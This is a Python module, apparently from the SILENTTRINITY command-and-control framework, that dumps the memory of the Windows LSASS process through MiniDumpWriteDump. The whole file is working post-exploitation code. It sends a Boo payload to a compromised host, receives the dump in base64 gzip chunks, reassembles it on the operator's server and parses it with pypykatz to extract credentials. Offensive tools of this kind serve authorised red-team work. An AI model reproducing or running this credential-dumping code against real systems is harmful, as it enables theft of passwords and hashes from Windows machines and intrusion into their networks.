import gzip
import logging
import json
import os
from datetime import datetime
from base64 import b64decode
from silenttrinity.core.utils import get_path_in_package, get_path_in_data_folder
from silenttrinity.core.teamserver.module import Module
from pypykatz.pypykatz import pypykatz
from pypykatz.commons.common import UniversalEncoder


class STModule(Module):
    def __init__(self):
        self._new_dmp_file = True  # This sucks but its currently the only way to keep track if we want a new file

        self.name = 'boo/minidump'
        self.language = 'boo'
        self.description = 'Creates a memorydump of LSASS via the MiniDumpWriteDump Win32 API Call then downloads the dump and parses it for creds using Pypykatz'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Dumpfile': {
                'Description': 'The Path of the dumpfile',
                'Required': False,
                'Value': r"C:\WINDOWS\Temp\debug.bin"
            },
            'ProcessName': {
                'Description': 'Process name to dump',
                'Required': False,
                'Value': "lsass"
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/minidump.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('DUMPFILE_PATH', self.options['Dumpfile']['Value'])
            src = src.replace('PROCESS_NAME', self.options['ProcessName']['Value'])
            return src

    def process(self, context, output):
        if self._new_dmp_file == True:
            self._new_dmp_file = False
            self.gzip_file = os.path.join(
                get_path_in_data_folder("logs"),
                f"{context.session.guid}/minidump_{datetime.now().strftime('%Y_%m_%d_%H%M%S')}.gz"
            )
            self.decompressed_file = os.path.join(
                get_path_in_data_folder("logs"),
                f"{context.session.guid}/minidump_{datetime.now().strftime('%Y_%m_%d_%H%M%S')}.bin"
            )

        try:
            file_chunk = output['data']
            with open(self.gzip_file, 'ab+') as reassembled_gzip_file:
                reassembled_gzip_file.write(b64decode(file_chunk))

            if output['current_chunk_n'] == (output['chunk_n'] + 1):
                try:
                    with open(self.decompressed_file, 'wb') as reassembled_file:
                        with gzip.open(self.gzip_file) as compressed_mem_dump:
                            reassembled_file.write(compressed_mem_dump.read())
                except Exception as e:
                    logging.error(f"Error decompressing re-assembled memory dump: {e}")

                results = pypykatz.parse_minidump_file(self.decompressed_file)
                self._new_dmp_file = True
                return json.dumps(results, cls = UniversalEncoder, indent=4, sort_keys=True)

            else:
                return f"Processed chunk {output['current_chunk_n']}/{output['chunk_n'] + 1}"
        except TypeError:
            return output
